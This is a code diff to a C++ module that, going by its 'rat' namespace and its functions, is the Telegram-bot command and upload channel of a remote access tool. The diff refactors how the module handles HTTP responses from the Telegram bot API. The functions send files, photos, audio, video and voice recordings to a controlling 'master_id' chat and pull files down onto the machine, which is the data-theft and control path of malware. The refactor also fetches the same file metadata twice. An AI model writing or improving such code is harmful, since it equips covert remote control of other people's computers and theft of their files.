@@ -3,6 +3,7 @@
 #include "rat/networking.hpp"
 
 #include <cstring>
+#include <curl/curl.h>
 #include <fmt/core.h>
 #include <filesystem>
 #include <fstream>
@@ -75,33 +76,28 @@ std::string BaseBot::getBotFileUrl() const {
 }
 
 void BaseBot::setOffset() {
-    const std::string init_url = fmt::format(
-        "{}{}/getUpdates?offset=-1&limit=1",
-        TELEGRAM_BOT_API_BASE_URL, token
-    );
+    const std::string init_url = fmt::format("{}{}/getUpdates?offset=-1&limit=1",TELEGRAM_BOT_API_BASE_URL, token);
 
-    // Request updates
-    const size_t received_size = this->curl_client.sendHttpRequest(
+    const auto response = this->curl_client.sendHttpRequest(
         init_url,
         this->http_buffer,
         HTTP_RESPONSE_BUFFER_SIZE // ensure sendHttpRequest never exceeds this
     );
 
-    if (received_size == 0) {
+    if (response.size == 0 || response.curl_code != CURLE_OK) {
         ERROR_LOG("Failed to fetch updates (empty response).");
         return;
     }
+    if(response.size < sizeof(this->http_buffer)) {
+        std::memset(http_buffer + response.size, 0, simdjson::SIMDJSON_PADDING);
+    }
 
-    // Add simdjson padding
-    std::memset(this->http_buffer + received_size, 0, simdjson::SIMDJSON_PADDING);
-
-    // Parser
-    simdjson::ondemand::parser parser;
+    simdjson::ondemand::parser parser(HTTP_RESPONSE_BUFFER_SIZE + simdjson::SIMDJSON_PADDING);
     simdjson::ondemand::document doc;
     auto error = parser.iterate(
         this->http_buffer,
-        received_size,
-        received_size + simdjson::SIMDJSON_PADDING
+        response.size,
+        response.size + simdjson::SIMDJSON_PADDING
     ).get(doc);
 
     if (error) {
@@ -147,20 +143,19 @@ BotResponse BaseBot::sendMessage(const std::string& Text_Message) {
         char* escaped = curl_easy_escape(nullptr, Text_Message.c_str(), static_cast<int>(Text_Message.size()));
         if (!escaped) return BotResponse::UNKNOWN_ERROR;
 
-        std::string url = sending_message_url_base + escaped;
+        const std::string url = fmt::format("{}{}", sending_message_url_base , escaped);
         curl_free(escaped);
 
-        DEBUG_LOG("Sending message: {}", url);
+        DEBUG_LOG("Sending message to {}", url);
 
-        const size_t recieved_data_size = this->curl_client.sendHttpRequest(url, this->http_buffer, HTTP_RESPONSE_BUFFER_SIZE + simdjson::SIMDJSON_PADDING);
+        const auto response = this->curl_client.sendHttpRequest(url, this->http_buffer, HTTP_RESPONSE_BUFFER_SIZE + simdjson::SIMDJSON_PADDING);
 
-        if (recieved_data_size == 0) return BotResponse::CONNECTION_ERROR;
-        
-        std::memset(this->http_buffer + recieved_data_size, 0, simdjson::SIMDJSON_PADDING);
-        
-        
-        simdjson::ondemand::parser simdjson_parser(recieved_data_size + simdjson::SIMDJSON_PADDING);
-        simdjson::ondemand::document doc = simdjson_parser.iterate(http_buffer, recieved_data_size + simdjson::SIMDJSON_PADDING);
+        if (response.size == 0 || response.curl_code != CURLE_OK) return BotResponse::CONNECTION_ERROR;
+        if(response.size < sizeof(this->http_buffer)) {
+            std::memset(http_buffer + response.size, 0, simdjson::SIMDJSON_PADDING);
+        }
+        simdjson::ondemand::parser simdjson_parser(response.size);
+        simdjson::ondemand::document doc = simdjson_parser.iterate(http_buffer, response.size + simdjson::SIMDJSON_PADDING);
         const bool ok = doc["ok"].get_bool();
         
         return ok ? BotResponse::SUCCESS : BotResponse::UNKNOWN_ERROR;
@@ -170,7 +165,6 @@ BotResponse BaseBot::sendMessage(const std::string& Text_Message) {
         return BotResponse::CONNECTION_ERROR;
     }
 }
-
 
 BotResponse BaseBot::sendFile(const std::filesystem::path& File_Path, const std::string& arg_Caption) {
     try {
@@ -232,15 +226,15 @@ BotResponse BaseBot::sendFile(const std::filesystem::path& File_Path, const std:
         DEBUG_LOG("sendFile: mime_type resolved to '{}'", ctx.mime_type);
         DEBUG_LOG("sendFile: invoking uploadMimeFile() for {}", File_Path.string());
         
-        const bool result = this->curl_client.uploadMimeFile(ctx);
+        const auto response = this->curl_client.uploadMimeFile(ctx);
 
-        if (!result) {
+        if (response.curl_code != CURLE_OK) {
             ERROR_LOG("sendFile: uploadMimeFile() failed for '{}'", File_Path.string());
         } else {
             DEBUG_LOG("sendFile: uploadMimeFile() succeeded for '{}'", File_Path.string());
         }
 
-        return result ? BotResponse::SUCCESS : BotResponse::CONNECTION_ERROR;
+        return response.curl_code == CURLE_OK ? BotResponse::SUCCESS : BotResponse::CONNECTION_ERROR;
 
     } catch (const std::exception& e) {
         ERROR_LOG("sendFile: exception '{}'", e.what());
@@ -264,11 +258,11 @@ BotResponse BaseBot::sendPhoto(const std::filesystem::path& Photo_Path, const st
             {"chat_id", std::to_string(master_id)}
         };
         
-        const bool result = this->curl_client.uploadMimeFile(ctx);
-        if (!result) {
+        const auto response = this->curl_client.uploadMimeFile(ctx);
+        if (response.curl_code != CURLE_OK) {
             ERROR_LOG("Failed at uploading {}", Photo_Path.string());
         }
-        return result ? BotResponse::SUCCESS : BotResponse::CONNECTION_ERROR;
+        return response.curl_code == CURLE_OK ? BotResponse::SUCCESS : BotResponse::CONNECTION_ERROR;
     } catch (const std::exception& e) {
         ERROR_LOG("sendPhoto exception: {}", e.what());
         return BotResponse::CONNECTION_ERROR;
@@ -294,11 +288,11 @@ BotResponse BaseBot::sendAudio(const std::filesystem::path& Audio_Path, const st
         // Optionally set MIME type
         ctx.mime_type = "audio/mpeg"; // default for mp3/m4a
 
-        const bool result = this->curl_client.uploadMimeFile(ctx);
-        if (!result) {
+        const auto response = this->curl_client.uploadMimeFile(ctx);
+        if (response.curl_code != CURLE_OK) {
             ERROR_LOG("Failed at uploading audio: {}", Audio_Path.string());
         }
-        return result ? BotResponse::SUCCESS : BotResponse::CONNECTION_ERROR;
+        return response.curl_code == CURLE_OK ? BotResponse::SUCCESS : BotResponse::CONNECTION_ERROR;
 
     } catch (const std::exception& e) {
         ERROR_LOG("sendAudio exception: {}", e.what());
@@ -325,11 +319,11 @@ BotResponse BaseBot::sendVideo(const std::filesystem::path& Video_Path, const st
 
         ctx.mime_type = "video/mp4"; // default for mp4
 
-        const bool result = this->curl_client.uploadMimeFile(ctx);
-        if (!result) {
+        const auto response = this->curl_client.uploadMimeFile(ctx);
+        if (response.curl_code != CURLE_OK) {
             ERROR_LOG("Failed at uploading video: {}", Video_Path.string());
         }
-        return result ? BotResponse::SUCCESS : BotResponse::CONNECTION_ERROR;
+        return response.curl_code == CURLE_OK ? BotResponse::SUCCESS : BotResponse::CONNECTION_ERROR;
 
     } catch (const std::exception& e) {
         ERROR_LOG("sendVideo exception: {}", e.what());
@@ -356,11 +350,11 @@ BotResponse BaseBot::sendVoice(const std::filesystem::path& Voice_Path, const st
 
         ctx.mime_type = "audio/ogg"; // default for Telegram voice messages
 
-        const bool result = this->curl_client.uploadMimeFile(ctx);
-        if (!result) {
+        const auto response = this->curl_client.uploadMimeFile(ctx);
+        if (response.curl_code != CURLE_OK) {
             ERROR_LOG("Failed at uploading voice message: {}", Voice_Path.string());
         }
-        return result ? BotResponse::SUCCESS : BotResponse::CONNECTION_ERROR;
+        return response.curl_code == CURLE_OK ? BotResponse::SUCCESS : BotResponse::CONNECTION_ERROR;
 
     } catch (const std::exception& e) {
         ERROR_LOG("sendVoice exception: {}", e.what());
@@ -368,40 +362,45 @@ BotResponse BaseBot::sendVoice(const std::filesystem::path& Voice_Path, const st
     }
 }
 
-
-
 bool BaseBot::downloadFile(const std::string& File_Id, const std::filesystem::path& Out_Path) {
-    try {
-        std::string get_file_url = fmt::format("{}{}", getting_file_url, File_Id);
-        
-        const size_t recieved_data_size= this->curl_client.sendHttpRequest(get_file_url.c_str(), this->http_buffer, HTTP_RESPONSE_BUFFER_SIZE + simdjson::SIMDJSON_PADDING);
+    const std::string get_file_url = fmt::format("{}{}", getting_file_url, File_Id);
 
-        if (recieved_data_size == 0) return false;
-        
-        DEBUG_LOG("Bytes that were retrieved from the https request {}", recieved_data_size);
-        
-        // Use simdjson instead of nlohmann
-        std::memset(this->http_buffer + recieved_data_size, 0, simdjson::SIMDJSON_PADDING);
-        simdjson::ondemand::parser simdjson_parser(recieved_data_size + simdjson::SIMDJSON_PADDING);
-        simdjson::ondemand::document doc = simdjson_parser.iterate(http_buffer, recieved_data_size);
-        const bool ok = doc["ok"].get_bool();
-        if (!ok) return false;
+    const auto response = this->curl_client.sendHttpRequest(
+        get_file_url.c_str(),
+        this->http_buffer,
+        HTTP_RESPONSE_BUFFER_SIZE + simdjson::SIMDJSON_PADDING
+    );
 
-        const std::string_view file_path = doc["result"]["file_path"].get_string();
-        const std::string file_url = fmt::format("{}/file/bot{}/{}", TELEGRAM_API_URL, token, file_path);
+    if (response.curl_code != CURLE_OK || response.size == 0) return false;
 
-        const auto file_data = this->curl_client.sendHttpRequest(file_url);
+    DEBUG_LOG("HTTP response received ({} bytes): {}", response.size, this->http_buffer);
 
-        std::ofstream ofs(Out_Path, std::ios::binary);
-        if (!ofs) return false;
+        // Fetch JSON metadata into a std::string
+    std::string json_raw;
+    {
+        std::vector<char> buffer;
+        buffer.reserve(1024);
+        auto response = this->curl_client.sendHttpRequest(get_file_url.c_str(), buffer);
+        if (response.curl_code != CURLE_OK || response.size == 0) return false;
 
-        ofs.write(file_data.data(), file_data.size());
-        return true;
-        
-    } catch (const std::exception& e) {
-        ERROR_LOG("downloadFile exception: {}", e.what());
-        return false;
+        json_raw.assign(buffer.begin(), buffer.begin() + response.size);
     }
+
+    // Convert to simdjson::padded_string
+    simdjson::padded_string padded_json = simdjson::padded_string(json_raw);
+
+    // Parse safely
+    simdjson::ondemand::parser parser;
+    simdjson::ondemand::document doc = parser.iterate(padded_json);
+    if (!doc["ok"].get_bool()) return false;
+
+    const std::string_view file_path = doc["result"]["file_path"].get_string();
+    const std::string file_url = fmt::format("{}/file/bot{}/{}", TELEGRAM_API_URL, token, file_path);
+
+    const std::filesystem::path file_name = std::filesystem::path(file_path).filename();
+    const auto download_response = this->curl_client.download(file_url, std::filesystem::current_path() / file_name);
+
+    return download_response.curl_code == CURLE_OK;
 }
 
 } // namespace rat::tbot
